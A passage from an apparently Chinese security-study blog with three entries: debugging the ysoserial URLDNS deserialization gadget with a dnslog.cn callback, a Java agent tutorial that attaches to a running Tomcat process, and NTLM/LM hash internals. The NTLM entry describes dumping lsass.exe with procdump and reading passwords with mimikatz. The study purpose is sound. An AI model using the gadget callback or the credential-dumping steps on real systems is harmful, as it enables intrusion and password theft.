PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>URLStreamHandler</code>还没有分析过作用，</p>
<p>先引入p神博客上的说明</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先：URLStreamHandler，引用别人对这个类的理解。</span><br></pre></td></tr></table></figure>

<p>   一般而言， URL 的格式是： protocol://[authority]hostname:port/resource?queryString 。 URL 类能够解析出 protocol、 hostname 、 port 等信息。 Protocol 决定了交互规范，通用的协议，比如 HTTP 、 File 、 FTP 等协议， JDK 自带了默认的通讯实现。当然，自定义实现是允许的。 Hostname 和 port 一般用于 Socket 或者基于 Socket 其他协议通讯方式。Resource 即资源上下文。可能读者利用 URL ，通过指定协议（ protocol ）来获取指定资源的读写，比如 JDK 内置了HTTP 、 File 、 FTP 等协议的处理方法。</p>
<p>   在成功地构造 URL 实例之后， URL API 中定义了一个 openConnection() 方法，返回一个 java.net.URLConnection 抽象类型的实例。不过，这里 URL 对象是代理对象，实际调用的是， java.net.URLStreamHandler 对象的 openConnection() 方法。</p>
<p>　　我觉得可以理解为URLStreamHandler handler = new SilentURLStreamHandler();是初始化一个方法，到时候你的URL实例会根据这个类方法调用不同的操作。openConnection和getHostAddress是可以自定义的，说明协议可以自定义，自定义的协议做自定义的操作</p>
</blockquote>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><ul>
<li><p>MacOs(10.15.7)</p>
</li>
<li><p>Java(jdk 1.8)</p>
<blockquote>
<p>必须是 1.8 以后，因为在1.8 以前HashMap.readObject() 方法中没有调用 HashMap.putVal() 方法，触发不了gadget</p>
</blockquote>
</li>
</ul>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>每一个gadget的java类中都自带一个<code>main</code>方法，使用<code>PayloadRunner</code>执行这个payload，所以直接使用这个进行调试，在<code>PayloadRunner</code>中，有一个<code>Command</code>，即需要执行的命令。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102512107.png" alt="image-20201118102512107"></p>
<p>默认的<code>command</code>是调用<code>calc.exe</code></p>
<p>由于本gadget是不能进行命令执行，只能进行一次DNS查询，所以需要对<code>command</code>进行赋值，这里在免费的<code>http://www.dnslog.cn/</code>请求一个子域名</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102845625.png" alt="image-20201118102845625"></p>
<p>用这个子域名赋值<code>command</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// write by my self</span></span><br><span class="line">    String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">    PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得一提的是，上述<code>command</code>中的<code>http://</code>不能省略，因为在<code>getObject() -&gt; new URL()</code>的时候，会把<code>command</code>传入参数，在构造方法里，判断了协议</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = start ; !aRef &amp;&amp; (i &lt; limit) &amp;&amp;</span><br><span class="line">                     ((c = spec.charAt(i)) != <span class="string">&#x27;/&#x27;</span>) ; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        String s = spec.substring(start, i).toLowerCase();</span><br><span class="line">        <span class="keyword">if</span> (isValidProtocol(s)) &#123;</span><br><span class="line">            newProtocol = s;</span><br><span class="line">            start = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果省略协议，则会抛出异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (protocol == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;no protocol: &quot;</span>+original);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>在<code>HashMap.ReadObject()</code>处下断点，运行到<code>putVal</code>处，</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118104047928.png" alt="image-20201118104047928"></p>
<p>跟进<code>hash(key)</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>key.hashCode()</code>会调用<code>URL.hashCode()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后会调用<code>handler.hashCode(this)</code>，这个<code>handler</code>是一个<code>URLStreamHandler</code>类对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">   ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到<code>getHostAddress()</code>，这个函数中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了一个<code>InetAddress.getByName(host)</code>方法，顾名思义，这个方法是发起一次DNS请求，解析目标域名。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118105831277.png" alt="image-20201118105831277"></p>
<p>到这里，这个利用链已经调试结束，利用链不长。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul>
<li>这个利用链只有<code>dns请求</code>，可以用作检测目标是否存在反序列化漏洞。</li>
</ul>
]]></content>
      <categories>
        <category>JavaWeb</category>
        <category>ysoserial</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>ysoserial</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-agent 入门</title>
    <url>//java-agent.html</url>
    <content><![CDATA[<p><code>java-agent</code>基础学习</p>
<a id="more"></a>



<h1 id="Java-agent"><a href="#Java-agent" class="headerlink" title="Java-agent"></a>Java-agent</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>介绍啥的之后再补吧（</p>
<p>先把代码贴上去，免得忘了</p>
<p>使用方法有两种：</p>
<p>由<code>MANIFEST&gt;MF</code>决定（注：<code>:</code>之后一定要有一个空格）</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">Manifest-Version</span>: <span class="string">1.0</span></span><br><span class="line"><span class="meta">Can-Redefine-Classes</span>: <span class="string">true</span></span><br><span class="line"><span class="meta">Can-Retransform-Classes</span>: <span class="string">true</span></span><br><span class="line"><span class="meta">Agent-Class</span>: <span class="string">agent.TestAgent2</span></span><br><span class="line"><span class="meta">Pre-Class</span>: <span class="string">agent.TestAgent1</span></span><br></pre></td></tr></table></figure>

<p>分别对应下列两种情况：</p>
<ul>
<li><p>JVM启动前静态Instrument</p>
<ul>
<li><p><code>premain</code>方法</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TestAgent1.java</span></span><br><span class="line"><span class="keyword">package</span> agent;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;premain test&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;agent args: &quot;</span> + agentArgs);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//        System.out.println(agentArgs);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load class: &quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>JVM启动后动态Instrument</p>
<ul>
<li><p><code>agentmain</code>方法</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TestAgent2.java</span></span><br><span class="line"><span class="keyword">package</span> agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAgent2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;/tmp/tomcat/a&quot;</span>), <span class="keyword">false</span>);</span><br><span class="line">        fileOutputStream.write(<span class="string">&quot;start\n&quot;</span>.getBytes());</span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; aClass : classes) &#123;</span><br><span class="line">            Boolean isMod = inst.isModifiableClass(aClass);</span><br><span class="line">            String mod;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span> (isMod) &#123;</span><br><span class="line">                mod = <span class="string">&quot;True&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mod = <span class="string">&quot;false&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String classname = <span class="string">&quot;class &quot;</span> + i + <span class="string">&quot; name: &quot;</span> + aClass.getName() + <span class="string">&quot;\t\t&quot;</span> + mod + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            fileOutputStream.write(classname.getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        fileOutputStream.write(<span class="string">&quot;ends\n&quot;</span>.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





</li>
</ul>
</li>
</ul>
<h3 id="JVM启动前静态Instrument"><a href="#JVM启动前静态Instrument" class="headerlink" title="JVM启动前静态Instrument"></a>JVM启动前静态Instrument</h3><p>在JVM启动前使用<code>java-agent</code>需要使用<code>-javaagent:jar_path.jar</code></p>
<p>参数指定<code>jar_path.jar</code>来指定</p>
<p>具体的语法在之后列出</p>
<h3 id="JVM启动后动态Instrument"><a href="#JVM启动后动态Instrument" class="headerlink" title="JVM启动后动态Instrument"></a>JVM启动后动态Instrument</h3><p>需要得到被插入进程的<code>pid</code>，用<code>jps -m</code>可以看到</p>
<p>需要新建一个进程，插入相应的jar包</p>
<p>示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentInitializationException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentLoadException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException </span>&#123;</span><br><span class="line">        VirtualMachine vm = VirtualMachine.attach(<span class="string">&quot;pid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String path = your_jar_path;</span><br><span class="line">            vm.loadAgent(path);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AgentLoadException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AgentInitializationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>启动<code>tomcat</code>，写一个简单的页面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;&lt;h1&gt;hello&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>导出的结果</p>
<p>由于太长了，只取一小部分</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line">class 1 name: jdk.internal.reflect.GeneratedConstructorAccessor8	True</span><br><span class="line">class 2 name: jdk.internal.reflect.GeneratedMethodAccessor22	True</span><br><span class="line">class 3 name: jdk.internal.reflect.GeneratedMethodAccessor21	True</span><br><span class="line">class 4 name: jdk.internal.reflect.GeneratedMethodAccessor20	True</span><br><span class="line">class 5 name: jdk.internal.reflect.GeneratedMethodAccessor19	True</span><br><span class="line">class 6 name: jdk.internal.reflect.GeneratedMethodAccessor18	True</span><br><span class="line">class 7name: LoginServlet	True</span><br><span class="line">class 8 name: jdk.internal.reflect.GeneratedSerializationConstructorAccessor18	True</span><br><span class="line">class 9 name: java.lang.invoke.LambdaForm$MH&#x2F;0x0000000800c8ac40	false</span><br><span class="line">class 10 name: java.lang.invoke.LambdaForm$MH&#x2F;0x0000000800c8a840	false</span><br><span class="line">class 11 name: java.lang.invoke.LambdaForm$MH&#x2F;0x0000000800c8a440	false</span><br></pre></td></tr></table></figure>



<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>JavaWeb</category>
        <category>java-agent</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>java-agent</tag>
      </tags>
  </entry>
  <entry>
    <title>windows NTLM协议</title>
    <url>//windows_NTLM.html</url>
    <content><![CDATA[<p>Windows下<code>NTLM</code>协议的相关认知</p>
<p>学海无涯，回头是岸。</p>
<a id="more"></a>

<p>被好多面试师傅都问到了windows认证相关的协议</p>
<p>填坑之路第二篇（</p>
<h1 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h1><h2 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h2><p>在windows启动时，会要求输入用户的密码</p>
<p>账户A输入的密码会和<code>%systemroot%\system32\config\sam</code>文件中存储的密码进行比较</p>
<p>当然为了安全性，sam文件存放的肯定不是明文密码，而是密码的hash值，即<code>A_password_hash</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201209201614581.png" alt="image-20201209201614581"></p>
<h3 id="HTLM-hash"><a href="#HTLM-hash" class="headerlink" title="HTLM hash"></a>HTLM hash</h3><p>这个<code>A_password_hash</code>被称之为<code>NTLM hash</code>，其中<code>HTLM</code>是一种网络认证协议，是以<code>NTLM hash</code>为基础的认证协议。</p>
<p>那么这个<code>NTLM hash</code>是如何生成的呢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin -&gt; hex(16进制编码) &#x3D; 61646d696e</span><br><span class="line">61646d696e -&gt; Unicode &#x3D; 610064006d0069006e00</span><br><span class="line">610064006d0069006e00 -&gt; MD4 &#x3D; 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  上面的流程来自</p>
<p>  <a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a></p>
</blockquote>
<h4 id="测试NTLM-hash"><a href="#测试NTLM-hash" class="headerlink" title="测试NTLM hash"></a>测试NTLM hash</h4><p>自己编写了一个代码来测试一下hash结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面这Windows.md4 是自己实现的一个md4加密的方法</span></span><br><span class="line"><span class="keyword">from</span> Windows.md4 <span class="keyword">import</span> MD4</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NTLM_hash</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, password=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_password</span>(<span class="params">self, password</span>):</span></span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hexdigest</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># utf-16 编码完最前面有 FE FF 表示UTF-16</span></span><br><span class="line">        tmp_byte = self.password.encode(<span class="string">&#x27;utf-16&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">return</span> MD4(tmp_byte).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    ntlm = NTLM_hash(<span class="string">&#x27;hongrisec@2020&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;hongrisec@2020 ==&gt; &quot;</span>, ntlm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201209212756243.png" alt="image-20201209212756243"></p>
<p>到windows上面使用<code>mimikatz</code>查看一下<code>sekurlsa::logonpasswords</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201209212942221.png" alt="image-20201209212942221"></p>
<p>结果一致</p>
<h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><p>当用户登录时，调用<code>winlogon.exe</code>（即登录程序），等待用户输入密码，接收到输入之后把密码就给<code>lsass.exe</code>进程，这个进程会存放一份明文密码，并且将明文密码使用上面的步骤转换成<code>NTLM hash</code>与<code>SAM</code>数据库比较</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winlogon.exe &#x3D;&#x3D;&gt; 接收用户输入的密码 &#x3D;&#x3D;&gt; lsass.exe &#x3D;&#x3D;&gt; (认证)</span><br></pre></td></tr></table></figure>



<p>既然<code>lsass.exe</code>存放的是明文的密码，那么就是不安全的</p>
<p><code>mimikatz</code>工具提供了一个方法，可以从<code>lsass.exe</code>的内存中读取密码，所以可以先对<code>lsass.exe</code>进程使用<code>procdump</code>(微软官方提供的软件，用于转储进程的内存)，然后下载导出的文件，使用<code>mimikatz</code>解密，得到管理员（已经登录的）的密码</p>
<h3 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a>LM hash</h3><p>NTLM协议的前身是LM协议</p>
<p>两者的加密算法不同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将所有小写字母转换为大写字母</span><br><span class="line">• &gt;123ABC &#x2F;&#x2F; 未达到7个字符</span><br><span class="line">• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补</span><br><span class="line">• &gt;31323341424300000000000000</span><br><span class="line">• 将密码分割为两组7个字节的块</span><br><span class="line">• &gt;31323341424300 00000000000000 &#x2F;&#x2F; 16进制</span><br><span class="line">• 将每组转化为比特流，不足56Bit则在左边加0</span><br><span class="line">• &gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000</span><br><span class="line">• 将比特流按照7比特一组，分出8组，末尾加0</span><br><span class="line"></span><br><span class="line">由于后者都为0，结果可想而知，那就都是0;</span><br><span class="line">• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。</span><br><span class="line">• -&gt; 00110000100110001000110001101000000101000001001000001100 00000000</span><br><span class="line">• -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</span><br><span class="line">• 由于我们的密码不超过7字节，所以后面的一半是固定的:</span><br><span class="line">• AA-D3-B4-35-B5-14-04-EE</span><br><span class="line">• 连接两个DES加密字符串。这是LM哈希。</span><br><span class="line">• 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果密码长度小于7个字符，那么第二部分的结果的值将是固定的</p>
<p>  <code>AAD3B435B51404EE</code></p>
</li>
<li><p>  可以通过观察最后这一部分，判断密码的长度是否低于7个字符</p>
</li>
</ul>
<h4 id="测试-LM-hash"><a href="#测试-LM-hash" class="headerlink" title="测试 LM hash"></a>测试 LM hash</h4><p>自己试着写了一个小程序</p>
<ul>
<li>  key为分组后的结果</li>
<li>  加密的内容为<code>KGS!@#$%</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LM_hash</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, password=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.password = password</span><br><span class="line">        self.key = <span class="string">b&#x27;KGS!@#$%&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.password + <span class="string">&quot; ==&gt; &quot;</span> + self.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hexdigest</span>(<span class="params">self</span>):</span></span><br><span class="line">        password = self.password.upper()</span><br><span class="line">        password = password.encode().ljust(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        password = <span class="built_in">hex</span>(bytes_to_long(password))[<span class="number">2</span>:]</span><br><span class="line">        tmp_list = [<span class="string">&#x27;0x&#x27;</span> + password[:<span class="number">14</span>], <span class="string">&#x27;0x&#x27;</span> + password[<span class="number">14</span>:]]</span><br><span class="line">        ans = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            tmp_key = []</span><br><span class="line">            key = <span class="built_in">int</span>(tmp_list[i], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                tmp_key.append(<span class="built_in">hex</span>((key &amp; <span class="number">0x7f</span>) * <span class="number">0x2</span>)[<span class="number">2</span>:])</span><br><span class="line">                key = key &gt;&gt; <span class="number">7</span></span><br><span class="line"></span><br><span class="line">            tmp_key.reverse()</span><br><span class="line">            key = <span class="string">&quot;0x&quot;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> tmp_key:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(j) &lt; <span class="number">2</span>:</span><br><span class="line">                    j = <span class="string">&#x27;0&#x27;</span> + j</span><br><span class="line">                key 